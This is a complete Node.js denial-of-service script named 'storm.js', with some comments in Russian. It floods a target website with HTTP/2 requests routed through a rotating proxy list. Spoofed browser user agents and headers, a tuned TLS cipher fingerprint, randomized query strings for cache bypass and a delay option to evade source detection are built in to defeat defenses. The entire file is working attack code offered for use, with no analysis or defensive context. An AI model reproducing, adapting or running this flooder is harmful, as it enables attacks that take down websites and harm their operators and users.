const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});
if (process.argv.length < 7) {
  console.log(`node storm.js [target] [time] [rate] [thread] [proxy]`);
  console.log(`optional: --path ( for cache bypass ) --delay=ms ( for bypass known sources )`);
  process.exit();
}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(min, max) {
  return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
  return arr[(Math.random() * arr.length) | 0];
}
function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
function parseDelay() {
    const delayArg = process.argv.find(arg => arg.startsWith('--delay='));
    if (delayArg) {
        const delayValue = parseInt(delayArg.split('=')[1]);
        return isNaN(delayValue) ? 0 : delayValue;
    }
    return 0;
}
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    pathFlag: process.argv.includes('--path'),
    delay: parseDelay()
};
var proxies = readLines(args.proxyFile);
const parsedTarget = new URL(args.target);
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}
class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}
const Socker = new NetSocket();
const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = ["en-US","en-GB","en","de","fr","es","pt-BR","it","ru","ja","nl","pl","ko","tr","sv","au"];
const useragents = [
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/22B91 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
];

function buildHeaders() {
    let rand_path;
    if (args.pathFlag) {
        const rand_query = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        rand_path = (parsedTarget.pathname || "/") + rand_query;
    } else {
        rand_path = parsedTarget.pathname || "/";
    }
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":path": rand_path,
        ":authority": parsedTarget.host,
        "sec-fetch-dest": "document",
        "user-agent": randomElement(useragents),
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-mode": "navigate",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br"
    };
    return headers;
}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return
        connection.setKeepAlive(true, 600000);
        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305",
            sigalgs: "ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512",
            ecdhCurve: 'X25519:prime256v1:secp384r1:secp521r1',
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 4096,
                maxConcurrentStreams: 100,
                initialWindowSize: 2097152,
                maxFrameSize: 16384,
            },
            createConnection: () => tlsConn
        });
        client.on("connect", () => {
            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

            if (args.delay > 0) {
                // Логика с задержкой между КАЖДЫМ запросом
                setInterval(async () => {
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(buildHeaders(), {
                            parent: randomIntn(100, 9999),
                            exclusive: Math.random() > 0.5
                        });
                        request.close();
                        
                        // Ждем указанное количество ms перед следующим запросом в цикле
                        await sleep(args.delay);
                    }
                }, 1000);
            } else {
                // Стандартная логика: отправка всей пачки Rate мгновенно
                setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(buildHeaders(), {
                            parent: randomIntn(100, 9999),
                            exclusive: Math.random() > 0.5
                        });
                        request.close();
                    }
                }, 1000);
            }
        });
        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
